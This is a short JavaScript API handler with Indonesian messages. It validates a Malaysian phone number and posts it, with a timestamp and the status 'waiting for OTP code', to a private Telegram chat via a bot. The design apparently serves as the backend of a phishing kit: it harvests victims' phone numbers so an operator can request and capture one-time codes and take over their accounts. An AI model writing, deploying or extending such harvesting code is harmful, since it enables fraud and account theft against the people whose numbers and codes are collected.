export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { phone } = req.body;

  const malaysiaRegex = /^\+601[0-9]{8,10}$/;
  if (!phone || !malaysiaRegex.test(phone)) {
    return res.status(400).json({ error: 'Nomor HP tidak valid' });
  }

  const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  const text = `
📨 *REQUEST OTP - STORE*
━━━━━━━━━━━━━━━━
📱 *No. HP:* ${phone}
🕐 *Waktu:* ${waktu}
⏳ *Status:* Menunggu kode OTP
  `.trim();

  try {
    const tgRes = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: text, parse_mode: 'Markdown'
        })
      }
    );
    const tgData = await tgRes.json();
    if (!tgData.ok) throw new Error(tgData.description);
    res.status(200).json({ success: true });
  } catch (err) {
    console.error('Telegram error:', err);
    res.status(500).json({ error: 'Gagal kirim ke Telegram' });
  }
}